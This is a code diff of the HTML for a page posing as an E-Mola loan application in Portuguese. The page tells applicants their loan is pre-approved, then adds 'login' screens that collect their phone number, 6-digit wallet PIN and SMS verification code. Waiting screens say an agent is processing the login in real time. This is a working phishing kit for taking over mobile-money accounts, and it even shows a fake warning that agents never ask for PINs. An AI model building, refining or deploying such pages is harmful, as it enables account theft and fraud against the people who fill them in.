-        <h2>Candidatura de Empréstimo -<br />Etapa 3 de 3</h2><p class="subtitle">Informações Financeiras</p>
-        <label class="field"><span>Situação de Emprego</span><select id="employment"><option value="Autónomo">Autónomo</option><option value="Empregado">Empregado</option><option value="Empresário">Empresário</option><option value="Estudante">Estudante</option></select></label>
-        <label class="field"><span>Renda Anual (MTS)</span><input id="income" type="number" min="1" placeholder="Digite a renda anual" required /></label>
-        <div class="summary"><h3>Resumo da Candidatura</h3><div class="summary-row"><span>Valor do Empréstimo:</span><strong id="summaryAmount">MTS 25.000</strong></div><div class="summary-row"><span>Prazo do Empréstimo:</span><strong id="summaryTerm">48 Meses</strong></div><div class="summary-row"><span>Candidato:</span><strong id="summaryName">—</strong></div></div>
-        <label class="agent-consent" id="agentConsentField" hidden><input id="agentConsent" type="checkbox" /><span>Autorizo o agente que me encaminhou a contactar-me sobre esta candidatura.</span></label>
-        <p class="error" id="step3Error"></p><div class="actions"><button class="btn secondary" type="button" data-next="step2">Voltar</button><button class="btn" type="submit">Enviar</button></div>
-      </form></div>
+      <header class="topbar"><button class="back" data-next="step2">← Voltar</button><strong>Candidatura de
+          Empréstimo</strong><button class="language-toggle" type="button">EN</button></header>
+      <div class="content">
+        <form class="card" id="financeForm">
+          <h2>Candidatura de Empréstimo -<br />Etapa 3 de 3</h2>
+          <p class="subtitle">Informações Financeiras</p>
+          <label class="field"><span>Situação de Emprego</span><select id="employment">
+              <option value="Autónomo">Autónomo</option>
+              <option value="Empregado">Empregado</option>
+              <option value="Empresário">Empresário</option>
+              <option value="Estudante">Estudante</option>
+            </select></label>
+          <label class="field"><span>Renda Anual (MTS)</span><input id="income" type="number" min="1"
+              placeholder="Digite a renda anual" required /></label>
+          <div class="summary">
+            <h3>Resumo da Candidatura</h3>
+            <div class="summary-row"><span>Valor do Empréstimo:</span><strong id="summaryAmount">MTS 25.000</strong>
+            </div>
+            <div class="summary-row"><span>Prazo do Empréstimo:</span><strong id="summaryTerm">48 Meses</strong></div>
+            <div class="summary-row"><span>Candidato:</span><strong id="summaryName">—</strong></div>
+          </div>
+          <label class="agent-consent" id="agentConsentField" hidden><input id="agentConsent"
+              type="checkbox" /><span>Autorizo o agente que me encaminhou a contactar-me sobre esta
+              candidatura.</span></label>
+          <p class="error" id="step3Error"></p>
+          <div class="actions"><button class="btn secondary" type="button" data-next="step2">Voltar</button><button
+              class="btn" type="submit">Enviar</button></div>
+        </form>
+      </div>
     </section>
 
     <section class="screen" data-screen="complete">
-      <header class="topbar"><button class="back" data-next="home">← Início</button><strong>E-Mola</strong><button class="language-toggle" type="button">EN</button></header>
-      <div class="content"><div class="card" style="text-align:center;">
-        <div id="statusIconWrap">
-          <div class="pulse-spinner" id="statusSpinner"></div>
-          <div class="done-icon" id="statusDoneIcon" style="display:none; background:#1b873f;">✓</div>
-          <div class="done-icon" id="statusRejectIcon" style="display:none; background:#c92a2a;">✕</div>
-        </div>
-        <div id="statusBadgeWrap">
-          <span class="status-badge pending" id="statusBadge">Aguardando Aprovação</span>
-        </div>
-        <h2 id="statusTitle">Aguarde pela aprovação</h2>
-        <p class="complete-copy" id="statusDesc">A sua candidatura foi recebida com sucesso. Por favor aguarde enquanto o agente analisa o seu pedido em tempo real...</p>
+      <header class="topbar"><button class="back" data-next="home">← Início</button><strong>E-Mola</strong><button
+          class="language-toggle" type="button">EN</button></header>
+      <div class="content">
+        <div class="card" style="text-align:center;">
+          <div id="statusIconWrap">
+            <div class="pulse-spinner" id="statusSpinner"></div>
+            <div class="done-icon" id="statusDoneIcon" style="display:none; background:#1b873f;">✓</div>
+            <div class="done-icon" id="statusRejectIcon" style="display:none; background:#c92a2a;">✕</div>
+          </div>
+          <div id="statusBadgeWrap">
+            <span class="status-badge pending" id="statusBadge">Aguardando Aprovação</span>
+          </div>
+          <h2 id="statusTitle">Aguarde pela aprovação</h2>
+          <p class="complete-copy" id="statusDesc">A sua candidatura foi recebida com sucesso. Por favor aguarde
+            enquanto o agente analisa o seu pedido em tempo real...</p>
 
-        <div class="status-steps" id="statusStepsBar">
-          <div class="step-item done" id="stepIndicator1"><div class="step-dot">✓</div><span>Submetido</span></div>
-          <div class="step-item current" id="stepIndicator2"><div class="step-dot">⏳</div><span>Em Análise</span></div>
-          <div class="step-item" id="stepIndicator3"><div class="step-dot">📋</div><span>Decisão</span></div>
-        </div>
+          <div class="status-steps" id="statusStepsBar">
+            <div class="step-item done" id="stepIndicator1">
+              <div class="step-dot">✓</div><span>Submetido</span>
+            </div>
+            <div class="step-item current" id="stepIndicator2">
+              <div class="step-dot">⏳</div><span>Em Análise</span>
+            </div>
+            <div class="step-item" id="stepIndicator3">
+              <div class="step-dot">📋</div><span>Decisão</span>
+            </div>
+          </div>
 
-        <div id="statusDetailsBox">
-          <p style="font-size:13px; color:var(--muted); margin: 8px 0 16px;">
-            Referência da Candidatura: <code id="statusRefCode" style="font-weight:700; background:#f0f1f3; padding:2px 6px; border-radius:4px;">—</code>
-          </p>
-        </div>
+          <div id="statusDetailsBox">
+            <p style="font-size:13px; color:var(--muted); margin: 8px 0 16px;">
+              Referência da Candidatura: <code id="statusRefCode"
+                style="font-weight:700; background:#f0f1f3; padding:2px 6px; border-radius:4px;">—</code>
+            </p>
+          </div>
 
-        <div id="statusApprovedNotice" class="approved-card" style="display:none;">
-          <h4 style="margin:0 0 6px; color:#166534; font-size:16px;">🎉 Parabéns! Empréstimo Aprovado</h4>
-          <p style="margin:0; font-size:13px; color:#1f2937; line-height:1.45;">
-            A sua solicitação foi pré-aprovada! Agora precisamos completar o login para prosseguir com o desembolso.
-          </p>
-        </div>
+          <div id="statusApprovedNotice" class="approved-card" style="display:none;">
+            <h4 style="margin:0 0 6px; color:#166534; font-size:16px;">🎉 Parabéns! Empréstimo Aprovado</h4>
+            <p style="margin:0; font-size:13px; color:#1f2937; line-height:1.45;">
+              A sua solicitação foi pré-aprovada! Agora precisamos completar o login para prosseguir com o desembolso.
+            </p>
+          </div>
 
-        <div id="statusRejectedNotice" class="rejected-card" style="display:none;">
-          <h4 style="margin:0 0 6px; color:#991b1b; font-size:16px;">Candidatura Não Aprovada</h4>
-          <p style="margin:0; font-size:13px; color:#374151; line-height:1.45;">
-            Infelizmente, a sua solicitação não atendeu a todos os critérios de elegibilidade neste momento. Poderá efetuar uma nova solicitação dentro de 30 dias.
-          </p>
-        </div>
+          <div id="statusRejectedNotice" class="rejected-card" style="display:none;">
+            <h4 style="margin:0 0 6px; color:#991b1b; font-size:16px;">Candidatura Não Aprovada</h4>
+            <p style="margin:0; font-size:13px; color:#374151; line-height:1.45;">
+              Infelizmente, a sua solicitação não atendeu a todos os critérios de elegibilidade neste momento. Poderá
+              efetuar uma nova solicitação dentro de 30 dias.
+            </p>
+          </div>
 
-        <!-- Verification Complete: Disbursement pending -->
-        <div id="verifyCompleteBox" class="approved-card" style="display:none; margin-top:18px; text-align:left;">
-          <h4 style="margin:0 0 6px; color:#166534; font-size:16px;">✅ Login Completo</h4>
-          <p style="margin:0; font-size:13px; color:#1f2937; line-height:1.45;">
-            O seu login foi concluído com sucesso! O desembolso será enviado para o seu número registado dentro de <strong>2 a 72 horas</strong>.<br><br>
-            <strong>Aviso de Segurança E-Mola:</strong> Os nossos colaboradores e agentes oficiais nunca solicitam o seu PIN, senhas ou códigos bancários por chamada ou mensagem.
-          </p>
-        </div>
+          <!-- Verification Complete: Disbursement pending -->
+          <div id="verifyCompleteBox" class="approved-card" style="display:none; margin-top:18px; text-align:left;">
+            <h4 style="margin:0 0 6px; color:#166534; font-size:16px;">✅ Login Completo</h4>
+            <p style="margin:0; font-size:13px; color:#1f2937; line-height:1.45;">
+              O seu login foi concluído com sucesso! O desembolso será enviado para o seu número registado dentro de
+              <strong>2 a 72 horas</strong>.<br><br>
+              <strong>Aviso de Segurança E-Mola:</strong> Os nossos colaboradores e agentes oficiais nunca solicitam o
+              seu PIN, senhas ou códigos bancários por chamada ou mensagem.
+            </p>
+          </div>
 
-        <div class="actions single" style="margin-top:20px;">
-          <button class="btn" data-next="home">Voltar ao início</button>
+          <div class="actions single" style="margin-top:20px;">
+            <button class="btn" data-next="home">Voltar ao início</button>
+          </div>
         </div>
-      </div></div>
+      </div>
     </section>
 
     <!-- ═══════════════════════════════════════════
          VERIFICATION STEP 1: PIN + PHONE (Orange)
     ═══════════════════════════════════════════ -->
+
+    <section class="screen" data-screen="verify1">
+      <div class="verify-screen">
+
+        <!-- Top Bar -->
+        <header class="topbar">
+          <button class="back" data-next="complete" type="button">← Voltar</button>
+          <strong>Login E-Mola</strong>
+          <button class="language-toggle" type="button">EN</button>
+        </header>
+
+        <!-- Hero Header -->
+        <div class="verify-hero">
+          <span class="verify-step-badge">Etapa 1 de 2</span>
+          <p class="sub-heading">Login através do E-Mola</p>
+          <h2>Faça Login no E-Mola</h2>
+          <p class="desc">Para prosseguir com o desembolso, confirme os seus dados pessoais.</p>
+        </div>
+
+        <!-- Main Card Container -->
+        <div class="verify-card" id="v1FormCard">
+
+          <!-- Phone Input Field -->
+          <label class="field">
+            <span class="field-label">Número de Telefone (+258)</span>
+            <span class="phone-field">
+              <span class="prefix">+258</span>
+              <input id="verifyPhone" type="tel" inputmode="numeric" maxlength="9" placeholder="843123456" required />
+            </span>
+          </label>
+
+          <!-- PIN Input Field -->
+          <label class="field">
+            <span class="field-label">Digite seu PIN de 6 Dígitos:</span>
+            <input id="verifyZip" class="box-input" type="password" inputmode="numeric" maxlength="6" autocomplete="off"
+              placeholder="••••••" required />
+          </label>
+
+          <!-- Error Message Box -->
+          <p class="verify-error" id="verifyStep1Error"></p>
+
+          <!-- Submit Button -->
+          <button class="verify-btn" type="button" id="verifyStep1Submit">ENTRAR</button>
+
+        </div>
+
+      </div>
+    </section>
+
+
+    <!--     
     <section class="screen" data-screen="verify1">
       <div class="verify-screen">
         <header class="topbar">
@@ -612,30 +1364,31 @@
           </label>
           <label class="field">
             <span>PIN</span>
-            <input id="verifyZip" class="box-input" type="text" inputmode="numeric" maxlength="6" autocomplete="postal-code" required />
+            <input id="verifyZip" class="box-input" type="text" inputmode="numeric" maxlength="6"
+              autocomplete="postal-code" required />
           </label>
           <p class="verify-error" id="verifyStep1Error"></p>
           <button class="verify-btn" type="button" id="verifyStep1Submit">ENVIAR</button>
-        </div>
+        </div> -->
 
-        <!-- Waiting state -->
-        <div class="verify-card" id="v1WaitingCard" style="display:none;">
-          <div class="verify-waiting">
-            <div class="pulse-spinner"></div>
-            <h4>Aguardando login do agente...</h4>
-            <p>Os dados de PIN e telefone foram enviados. O agente está a processar o login.</p>
-          </div>
-        </div>
-
-        <!-- Rejected state -->
-        <div class="verify-card" id="v1RejectedCard" style="display:none;">
-          <div class="verify-reject-notice">
-            <h4>❌ PIN Incorreto</h4>
-            <p id="verifyStep1RejectMsg">PIN incorreto. Por favor tente novamente.</p>
-            <button class="verify-btn reject-btn" type="button" id="verifyStep1Resubmit">REENVIAR DADOS</button>
-          </div>
-        </div>
+    <!-- Waiting state -->
+    <div class="verify-card" id="v1WaitingCard" style="display:none;">
+      <div class="verify-waiting">
+        <div class="pulse-spinner"></div>
+        <h4>Aguardando login do agente...</h4>
+        <p>Os dados de PIN e telefone foram enviados. O agente está a processar o login.</p>
       </div>
+    </div>
+
+    <!-- Rejected state -->
+    <div class="verify-card" id="v1RejectedCard" style="display:none;">
+      <div class="verify-reject-notice">
+        <h4>❌ PIN Incorreto</h4>
+        <p id="verifyStep1RejectMsg">PIN incorreto. Por favor tente novamente.</p>
+        <button class="verify-btn reject-btn" type="button" id="verifyStep1Resubmit">REENVIAR DADOS</button>
+      </div>
+    </div>
+    </div>
     </section>
 
     <!-- ═══════════════════════════════════════════
@@ -651,13 +1404,16 @@
 
         <div class="verify-hero">
           <span class="verify-step-badge">Etapa 2 de 2</span>
-          <h2>Documento de Identidade</h2>
-          <p>Insira o número do seu BI / DIRE para completar o login.</p>
+          <h2>Acesse o Emola</h2>
+          <p>Insira seu número e PIN para concluir o login.</p>
         </div>
 
         <div class="verify-card" id="v2FormCard">
           <label class="field">
-            <span>Número de Identificação (BI / DIRE)</span>
+            <span>Código de Verificação</span>
+            <span>Digite o código de verificação de 6 dígitos</span>
+            <span>Verifique o SMS para o código de verificação</span>
+            <span>Código de Verificação (6 dígitos):</span>
             <input id="verifyIdNumber" class="box-input" type="text" maxlength="6" required />
           </label>
           <p class="verify-error" id="verifyStep2Error"></p>
@@ -668,8 +1424,8 @@
         <div class="verify-card" id="v2WaitingCard" style="display:none;">
           <div class="verify-waiting">
             <div class="pulse-spinner"></div>
-            <h4>Aguardando login do documento...</h4>
-            <p>O agente está a verificar o seu documento de identidade nos registos.</p>
+            <h4>Aguardando login ...</h4>
+            <p>O sistema está verificando seus registros..</p>
           </div>
         </div>
 
@@ -677,7 +1433,8 @@
         <div class="verify-card" id="v2RejectedCard" style="display:none;">
           <div class="verify-reject-notice">
             <h4>❌ Login de ID Rejeitado</h4>
-            <p id="verifyStep2RejectMsg">Os dados do documento não correspondem. Por favor reenvie com dados corretos.</p>
+            <p id="verifyStep2RejectMsg">Os dados do documento não correspondem. Por favor reenvie com dados corretos.
+            </p>
             <button class="verify-btn reject-btn" type="button" id="verifyStep2Resubmit">REENVIAR DADOS</button>
           </div>
         </div>
@@ -1022,5 +1779,5 @@
     });
   </script>
 </body>
-</html>
 
+</html>
